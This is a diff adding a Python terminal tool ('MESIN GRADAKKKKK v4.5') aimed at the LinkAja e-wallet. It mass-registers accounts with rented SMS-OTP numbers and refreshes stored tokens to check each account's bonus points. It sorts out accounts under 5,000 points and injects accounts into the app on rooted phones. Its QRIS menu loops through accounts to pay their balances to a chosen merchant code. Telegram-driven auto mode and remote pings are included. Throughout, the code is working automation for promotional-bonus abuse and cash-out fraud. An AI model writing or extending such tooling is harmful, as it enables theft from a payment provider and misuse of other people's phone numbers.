+                jwt = data_ref["data"]["token"]
+                rt = data_ref["data"]["refreshToken"]
+                st["jwt"] = jwt
+                st["refreshToken"] = rt
+                with open(akun["file"], "w") as f:
+                    json.dump(st, f, ensure_ascii=False, indent=2)
+                token_auth = f"Bearer {jwt}"
+                res_bal = api_get(sess, "/user/balance", token=token_auth)
+                data_bal = decrypt_resp(res_bal, st) if res_bal.status_code == 200 else {}
+            else:
+                return "0", "0", "[red]Refresh Gagal[/]"
+
+        raw_bal = data_bal.get("data", {}).get("value", "0") if isinstance(data_bal.get("data"), dict) else "0"
+        saldo_utama = "".join(filter(str.isdigit, str(raw_bal))) or "0"
+
+        res_pt = api_get(sess, "/user/point", token=token_auth)
+        data_pt = decrypt_resp(res_pt, st) if res_pt.status_code == 200 else {}
+
+        raw_pt = data_pt.get("data", {}).get("total", "0") if isinstance(data_pt.get("data"), dict) else "0"
+        bonus_poin = "".join(filter(str.isdigit, str(raw_pt))) or "0"
+
+        status_msg = "[bold bright_green][+] Masuk![/]" if int(bonus_poin) >= 5000 else "[bright_yellow]Zonk[/]"
+        return saldo_utama, bonus_poin, status_msg
+
+    except Exception:
+        return "-", "-", "[red]Error[/]"
+
+def menu_cek_saldo():
+    print_section_header("[*] Cek Bonus", style="bright_green")
+    if not CRYPTO_AVAILABLE:
+        console.print("[bold red][X] Library pycryptodome belum diinstall.[/red]")
+        return
+
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] Folder states kosong.[/]")
+        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+        return
+
+    table = Table(
+        box=box.ROUNDED,
+        header_style="bold bright_white on dark_blue",
+        border_style="bright_cyan",
+        expand=False,
+    )
+    table.add_column("No", style="bright_cyan", justify="center", width=4)
+    table.add_column("Nomor", style="bright_green", width=15)
+    table.add_column("Saldo", justify="right", style="bright_yellow", width=12)
+    table.add_column("Bonus", justify="right", style="bright_magenta", width=12)
+    table.add_column("Status", justify="center", width=12)
+
+    jml_masuk = 0
+    jml_zonk = 0
+    jml_err = 0
+
+    with Live(table, console=console, refresh_per_second=1):
+        for idx, akun in enumerate(states, start=1):
+            saldo_utama, bonus_poin, status_msg = proses_cek_satu_akun(akun)
+            if "Masuk" in status_msg:
+                jml_masuk += 1
+            elif "Zonk" in status_msg:
+                jml_zonk += 1
+            else:
+                jml_err += 1
+
+            fmt_saldo = f"Rp {int(saldo_utama):,}".replace(",", ".") if saldo_utama.isdigit() else f"Rp {saldo_utama}"
+            fmt_poin = f"{int(bonus_poin):,} pts".replace(",", ".") if bonus_poin.isdigit() else f"{bonus_poin} pts"
+
+            table.add_row(str(idx), akun.get("msisdn", "?"), fmt_saldo, fmt_poin, status_msg)
+            time.sleep(0.2)
+
+    console.print(
+        Panel(
+            f"[bold white]Total:[/] {len(states)}  |  "
+            f"[bold bright_green]Masuk:[/] {jml_masuk}  |  "
+            f"[bold yellow]Zonk:[/] {jml_zonk}  |  "
+            f"[bold red]Error:[/] {jml_err}",
+            border_style="bright_cyan",
+            box=box.ROUNDED,
+            expand=False,
+        )
+    )
+    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+
+
+# ==========================================
+# MENU 5: RESTORE / INJECT TERMUX
+# ==========================================
+# MENU 5: RESTORE / INJECT TERMUX
+# ==========================================
+def menu_injeck_termux():
+    print_section_header("[*] Restore Termux", style="bright_magenta")
+
+    if not CRYPTO_AVAILABLE:
+        console.print("[bold red][X] pycryptodome belum diinstall.[/red]")
+        return
+
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] data/states kosong.[/]")
+        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+        return
+
+    akun_target = states[0]["file"]
+    nomor = states[0].get("msisdn", "?")
+
+    console.print(
+        Panel(
+            f"[bold white]Target:[/] [bold bright_green]{nomor}[/]  |  [bold white]Sisa:[/] [cyan]{len(states)} akun[/]",
+            border_style="magenta",
+            box=box.ROUNDED,
+            expand=False,
+        )
+    )
+
+    if not Confirm.ask("[bold magenta]>> Inject sekarang?[/]", default=True):
+        return
+
+    console.print()
+    try:
+        inject_termux_account(akun_target)
+    except InjectError as e:
+        console.print(f"\n[bold red][X] Gagal: {e}[/]")
+    except Exception as e:
+        console.print(f"\n[bold red][X] Error: {e}[/]")
+    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+
+
+# ==========================================
+# MENU 6: SORTIR AKUN
+# ==========================================
+def menu_sortir():
+    print_section_header("[*] Sortir Akun", style="bright_yellow")
+
+    if not CRYPTO_AVAILABLE:
+        console.print("[bold red][X] pycryptodome belum diinstall.[/red]")
+        return
+
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] data/states kosong.[/]")
+        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+        return
+
+    dir_base = Path(__file__).resolve().parent / "data"
+    dir_zonk = dir_base / "states_zonk"
+    dir_zonk.mkdir(parents=True, exist_ok=True)
+
+    count_bonus = 0
+    count_zonk = 0
+    count_error = 0
+
+    with Progress(
+        SpinnerColumn(spinner_name="line"),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[cyan]Sortir akun...", total=len(states))
+
+        for akun in states:
+            file_path = Path(akun["file"])
+            if not file_path.exists():
+                progress.advance(task)
+                continue
+
+            msisdn = akun.get("msisdn", "?")
+            progress.update(task, description=f"[cyan]Cek {msisdn}...[/]")
+
+            saldo_utama, bonus_poin, status_msg = proses_cek_satu_akun(akun)
+
+            if bonus_poin == "-" or "Error" in status_msg or "Sesi Mati" in status_msg:
+                progress.console.print(f"  [red][X] {msisdn}[/] -> Error")
+                count_error += 1
+                progress.advance(task)
+                continue
+
+            poin_int = int(bonus_poin) if str(bonus_poin).isdigit() else 0
+
+            try:
+                if poin_int >= 5000:
+                    progress.console.print(f"  [green][OK] {msisdn}[/] -> Bonus {poin_int:,}")
+                    count_bonus += 1
+                else:
+                    shutil.move(str(file_path), str(dir_zonk / file_path.name))
+                    progress.console.print(f"  [yellow][!] {msisdn}[/] -> Zonk ({poin_int:,})")
+                    count_zonk += 1
+            except Exception as e:
+                progress.console.print(f"  [red][X] {msisdn}: {e}[/]")
+
+            progress.advance(task)
+            time.sleep(0.2)
+
+    console.print(
+        Panel(
+            f"[bold green]Bonus (>= 5k):[/] {count_bonus}  |  "
+            f"[bold yellow]Zonk (< 5k):[/] {count_zonk}  |  "
+            f"[bold red]Error:[/] {count_error}",
+            title="[bold green]Selesai[/]",
+            border_style="bright_green",
+            expand=False
+        )
+    )
+    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+
+
+# ==========================================
+# MENU 7: FITUR DALAM PENGEMBANGAN
+# ==========================================
+def menu_fitur_segera(nama_fitur: str):
+    print_section_header(f"[*] {nama_fitur}", style="bright_yellow")
+    console.print(f"[dim yellow]Fitur {nama_fitur} segera hadir.[/]")
+    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+
+
+# ==========================================
+# MENU 8: SCAN BONUS & CASHOUT QRIS
+# ==========================================
+def menu_scan_bonus():
+    print_section_header("[*] Scan QRIS", style="bright_yellow")
+
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] data/states kosong.[/]")
+        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+        return
+
+    akun_siap = []
+    with Progress(
+        SpinnerColumn(spinner_name="line"),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[cyan]Cek saldo...", total=len(states))
+        for akun in states:
+            msisdn = akun.get("msisdn", "?")
+            progress.update(task, description=f"[cyan]Cek {msisdn}...[/]")
+            saldo_str, poin_str, st_msg = proses_cek_satu_akun(akun)
+            s_val = int(saldo_str) if str(saldo_str).isdigit() else 0
+            p_val = int(poin_str) if str(poin_str).isdigit() else 0
+            total_val = s_val + p_val
+
+            if total_val > 0:
+                akun_data = dict(akun)
+                akun_data["saldo"] = s_val
+                akun_data["bonus"] = p_val
+                akun_data["total"] = total_val
+                akun_siap.append(akun_data)
+
+            progress.advance(task)
+
+    if not akun_siap:
+        console.print("\n[bold red][X] Tidak ada akun dengan saldo (semua 0 / zonk).[/]")
+        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
+        return
+
+    akun_siap.sort(key=lambda a: -a["total"])
+
+    table_siap = Table(show_header=True, header_style="bold bright_cyan", box=box.SIMPLE_HEAD, padding=(0, 2))
+    table_siap.add_column("No", justify="center", style="bold yellow", width=4)
+    table_siap.add_column("Nomor HP", style="bright_white", width=15)
+    table_siap.add_column("Nama", style="dim", width=18)
+    table_siap.add_column("Bonus", justify="right", style="bold green", width=11)
+    table_siap.add_column("Utama", justify="right", style="bold yellow", width=11)
+    table_siap.add_column("Total", justify="right", style="bold bright_green", width=13)
+
+    total_pool = 0
+    for idx, ak in enumerate(akun_siap, 1):
+        total_pool += ak["total"]
+        table_siap.add_row(
+            str(idx),
+            ak["msisdn"],
+            ak.get("fullname", "User")[:16],
+            f"Rp {ak['bonus']:,}",
+            f"Rp {ak['saldo']:,}",
+            f"Rp {ak['total']:,}"
+        )
+
+    console.print()
+    console.print(
+        Panel(
+            table_siap,
+            title=f"[bold bright_yellow][*] Akun Siap Cair ({len(akun_siap)} Akun | Total Rp {total_pool:,})[/]",
+            border_style="bright_cyan",
+            box=box.ROUNDED,
+            expand=False
+        )
+    )
+
+    if not Confirm.ask("\n[bold cyan]>> Mulai eksekusi QRIS?[/]", default=True):
+        return
+
+    total_sukses = 0
+    total_gagal = 0
+    total_uang_cair = 0
+    cached_static_qr = ""
+
+    try:
+        for idx, akun in enumerate(akun_siap, 1):
+            clear_once()
+            print_section_header(f"[*] QRIS — Akun [{idx}/{len(akun_siap)}]", style="bright_yellow")
+
+            info_box = (
+                f"[bold white]{akun['msisdn']}[/] ({akun.get('fullname', 'User')}) | "
+                f"[bold green]Bonus:[/] Rp {akun['bonus']:,} | "
+                f"[bold yellow]Utama:[/] Rp {akun['saldo']:,} | "
+                f"[bold bright_green]Total:[/] Rp {akun['total']:,}"
+            )
+            console.print(Panel(info_box, border_style="bright_cyan", box=box.ROUNDED, padding=(0, 2)))
+            console.print("[dim]Ketik 's' lewati | Ctrl+C selesai[/]\n")
+
+            while True:
+                prompt_text = "[bold bright_yellow]>> Paste QR[/]"
+                if cached_static_qr:
+                    prompt_text = "[bold bright_yellow]>> Paste QR (Enter = pakai QR Statis sebelumnya)[/]"
+
+                try:
+                    raw_input = Prompt.ask(prompt_text, default="USE_CACHED" if cached_static_qr else "").strip()
+                except (KeyboardInterrupt, EOFError):
+                    raise KeyboardInterrupt
+
+                if raw_input == "USE_CACHED":
+                    raw_input = cached_static_qr
+
+                if not raw_input:
+                    continue
+                if raw_input.lower() == "s":
+                    console.print("[yellow][*] Dilewati.[/]")
+                    time.sleep(1)
+                    break
+                if raw_input.lower() in ("q", "quit", "exit"):
+                    raise KeyboardInterrupt
+
+                info_qr = qris.inspect_qr(raw_input)
+                if not info_qr["ok"]:
+                    console.print(f"[red][X] QR Tidak Valid:[/] {info_qr.get('err', 'CRC Error')}")
+                    continue
+
+                merchant_qr = info_qr.get("merchant", "Merchant")
+                is_dyn = info_qr.get("dynamic", False)
+                nominal_bayar = 0
+
+                if is_dyn:
+                    # QRIS Dinamis (Nominal sudah ada di QR)
+                    nominal_bayar = float(info_qr.get("amount_tag54") or 0)
+                    console.print(f"  [dim]Dinamis:[/] [cyan]{merchant_qr}[/] [dim]| Tagihan:[/] [bold green]Rp {int(nominal_bayar):,}[/]")
+                    if nominal_bayar > akun["total"]:
+                        console.print(f"[red][X] Tagihan Rp {int(nominal_bayar):,} melebihi saldo Rp {akun['total']:,}![/]")
+                        continue
+                else:
+                    # QRIS Statis (Nominal bebas / kita tentukan sendiri)
+                    console.print(f"  [dim]Statis:[/] [cyan]{merchant_qr}[/] [dim]| Bebas Nominal[/]")
+                    cached_static_qr = raw_input  # Simpan agar bisa langsung dipakai untuk akun berikutnya
+                    
+                    default_nom = akun["total"]
+                    nom_in = Prompt.ask(
+                        f"  [bold yellow]>> Nominal bayar[/]",
+                        default=str(default_nom)
+                    ).strip()
+                    try:
+                        nominal_bayar = float(int("".join(filter(str.isdigit, nom_in))))
+                    except ValueError:
+                        nominal_bayar = float(default_nom)
+
+                    if nominal_bayar <= 0:
+                        console.print("[red][X] Nominal harus > 0.[/]")
+                        continue
+                    if nominal_bayar > akun["total"]:
+                        console.print(f"[red][X] Nominal Rp {int(nominal_bayar):,} melebihi saldo Rp {akun['total']:,}![/]")
+                        continue
+
+                # Eksekusi pembayaran ke LinkAja
+                with console.status("[bold cyan]Memproses pembayaran...[/]", spinner="line"):
+                    ok, msg, detail = qris.pay_account_qris(
+                        akun["file"],
+                        raw_input,
+                        pin_fallback=PIN_KUNCI,
+                        custom_amount=nominal_bayar
+                    )
+
+                if ok:
+                    total_sukses += 1
+                    nom_dibayar = detail.get("nominal", nominal_bayar)
+                    total_uang_cair += nom_dibayar
+                    m_res = detail.get("merchant", merchant_qr)
+                    trx_id = detail.get("transactionId", "-")
+                    b_bonus = detail.get("bonbal_used", 0)
+                    b_utama = detail.get("balance_used", 0)
+
+                    sukses_msg = (
+                        f"[bold green]BERHASIL DIBAYAR![/]\n"
+                        f"[bold white]{m_res}[/] | [bold bright_green]Rp {int(nom_dibayar):,}[/] "
+                        f"[dim](Bonus: Rp {int(b_bonus):,} | Utama: Rp {int(b_utama):,})[/]"
+                    )
+                    console.print()
+                    console.print(Panel(sukses_msg, border_style="bright_green", box=box.ROUNDED))
+                    time.sleep(1.5)
+                    break
+                else:
+                    total_gagal += 1
+                    console.print()
+                    if detail.get("gantung"):
+                        sisa_u = int(detail.get("saldo_utama_sisa", 0))
+                        gantung_msg = (
+                            f"[bold yellow][!] TRANSAKSI GANTUNG (60010011)[/]\n"
+                            f"{msg}\n"
+                            f"[bold white]Saldo Utama Masih Utuh:[/] [bold bright_green]Rp {sisa_u:,}[/]\n"
+                            f"[dim]Tarik sisa saldo dengan QR nominal pas Rp {sisa_u:,}[/]"
+                        )
+                        console.print(Panel(gantung_msg, border_style="bright_yellow", box=box.ROUNDED))
+                    else:
+                        console.print(Panel(f"[bold red][X] Gagal:[/] {msg}", border_style="bright_red", box=box.ROUNDED))
+
+                    if not Confirm.ask(">> Coba lagi untuk akun ini?", default=False):
+                        break
+
+    except KeyboardInterrupt:
+        console.print("\n\n[bold yellow][!] Dihentikan (Ctrl+C).[/]")
+
+    # Ringkasan Akhir
+    console.print()
+    ringkasan = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+    ringkasan.add_column("Keterangan", style="bold")
+    ringkasan.add_column("Nilai", justify="right")
+    ringkasan.add_row("[bold green]Sukses[/]", f"{total_sukses} akun")
+    ringkasan.add_row("[bold red]Gagal / Lewat[/]", f"{total_gagal} akun")
+    ringkasan.add_row("[bold bright_green]Total Cair[/]", f"Rp {int(total_uang_cair):,}")
+
+    console.print(
+        Panel(
+            ringkasan,
+            title="[bold bright_yellow][*] RINGKASAN[/]",
+            border_style="bright_green",
+            box=box.ROUNDED,
+            expand=False
+        )
+    )
+    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali ke menu...[/]")
+
+
+# ==========================================
+# MASTER UI / MENU UTAMA
+# ==========================================
+def render_dashboard_header():
+    console.print(
+        Panel(
+            "[bold bright_yellow][ MESIN GRADAKKKKK v4.5 - MUMET EDITION ][/]\n"
+            "[dim]High-Speed Multi-Worker Engine · 0% Idle CPU · RAM Offload[/]",
+            border_style="bright_yellow",
+            box=box.ROUNDED,
+            padding=(0, 2)
+        )
+    )
+
+def menu_ganti_api_key():
+    print_section_header("[*] Pengaturan API Key", "Ubah API Key OTPInstan atau SMSBower", style="bright_yellow")
+    console.print(
+        "[bold cyan]Pilih API Key yang ingin diganti:[/]\n"
+        "  [bold bright_white]1.[/] API Key OTPInstan (api.txt)\n"
+        "  [bold bright_white]2.[/] API Key SMSBower  (smsbower.txt)\n"
+        "  [bold bright_white]0.[/] Kembali\n"
+    )
+    pilih = Prompt.ask("[bold cyan]>> Pilih[/]", choices=["1", "2", "0"], default="0")
+    if pilih == "1":
+        cur_key = ""
+        if os.path.exists("api.txt"):
+            with open("api.txt", "r") as f:
+                cur_key = f.read().strip()
+        disp = f"{cur_key[:6]}...{cur_key[-4:]}" if len(cur_key) > 10 else (cur_key or "Kosong")
+        console.print(f"[dim]Key saat ini: {disp}[/]")
+        new_k = Prompt.ask("[bold cyan]>> Masukkan API Key OTPInstan baru[/]").strip()
+        if new_k:
+            with open("api.txt", "w") as f:
+                f.write(new_k)
+            global API_KEY_OTP
+            API_KEY_OTP = new_k
+            console.print("[bold green][OK] API Key OTPInstan berhasil disimpan ke api.txt![/]\n")
+            time.sleep(1.5)
+    elif pilih == "2":
+        cur_key = ""
+        if os.path.exists("smsbower.txt"):
+            with open("smsbower.txt", "r", encoding="utf-8") as f:
+                cur_key = f.read().strip()
+        disp = f"{cur_key[:6]}...{cur_key[-4:]}" if len(cur_key) > 10 else (cur_key or "Kosong")
+        console.print(f"[dim]Key saat ini: {disp}[/]")
+        new_k = Prompt.ask("[bold cyan]>> Masukkan API Key SMSBower baru[/]").strip()
+        if new_k:
+            with open("smsbower.txt", "w", encoding="utf-8") as f:
+                f.write(new_k)
+            console.print("[bold green][OK] API Key SMSBower berhasil disimpan ke smsbower.txt![/]\n")
+            time.sleep(1.5)
+
+def main():
+    cleanup_core_folder()
+    auto_update()
+    bot_id = get_or_set_bot_id()
+    send_auto_ping(bot_id)
+    while True:
+        clear_once()
+        render_dashboard_header()
+
+        menu_table = Table(show_header=True, header_style="bold bright_cyan", box=box.SIMPLE_HEAD, padding=(0, 2))
+        menu_table.add_column("Kode", style="bold bright_yellow", justify="center", width=6)
+        menu_table.add_column("Menu Fitur", style="bold bright_white", width=36)
+
+        menu_table.add_row("[1]", "Daftar Manual (1 Akun Instan)")
+        menu_table.add_row("[2]", "Auto War Massal (Jadwal Cut-off)")
+        menu_table.add_row("[3]", "ADB Push (Khusus PC)")
+        menu_table.add_row("[4]", "Cek & Sortir Bonus 5.000")
+        menu_table.add_row("[5]", "Pasang Akun ke LinkAja apk (Root)")
+        menu_table.add_row("[7]", "Verifikasi Email")
+        menu_table.add_row("[8]", "Tarik Saldo / Scan QRIS")
+        menu_table.add_row("[9]", "Ganti API Key OTP")
+        menu_table.add_row("[0]", "[bright_red]Keluar[/]")
+
+        console.print(
+            Panel(
+                menu_table,
+                border_style="bright_yellow",
+                box=box.ROUNDED,
+                expand=False,
+            )
+        )
+
+        c = Prompt.ask(
+            "\n[bold bright_cyan]>> Pilih Menu[/]",
+            choices=["1", "2", "3", "4", "5", "7", "8", "9", "0"],
+            default="0"
+        )
+
+        if c == "0":
+            console.print("\n[dim]Keluar.[/]")
+            break
+
+        try:
+            if c == "1":
+                menu_daftar_manual()
+            elif c == "2":
+                menu_daftar_auto_bulk()
+            elif c == "3":
+                menu_inject()
+            elif c == "4":
+                menu_sortir()
+            elif c == "5":
+                menu_injeck_termux()
+            elif c == "7":
+                menu_fitur_segera("Verifikasi Email")
+            elif c == "8":
+                menu_scan_bonus()
+            elif c == "9":
+                menu_ganti_api_key()
+
+            if c in ["1", "2", "3", "4", "5", "6", "8", "9"]:
+                console.print()
+                console.print(Rule(style="bright_black"))
+                Prompt.ask("[dim cyan]Tekan [bold white]Enter[/bold white] untuk kembali ke menu...[/]")
+
+        except KeyboardInterrupt:
+            console.print("\n[dim]Batal (Ctrl+C).[/]")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        if len(sys.argv) > 1 and sys.argv[1] == "--auto":
+            # Mode otomatis dari Orchestrator Telegram: python bot.py --auto <server> <jumlah> [jam_mulai] [jam_tembak]
+            srv = sys.argv[2] if len(sys.argv) > 2 else "3"
+            jml = int(sys.argv[3]) if len(sys.argv) > 3 else 10
+            t_mulai = sys.argv[4] if len(sys.argv) > 4 else ""
+            t_kirim = sys.argv[5] if len(sys.argv) > 5 else ""
+            run_auto_bulk(srv, jml, t_mulai, t_kirim)
+        else:
+            auto_update()
+            main()
+    except KeyboardInterrupt:
+        console.print("\n[dim]Stop (Ctrl+C).[/]")
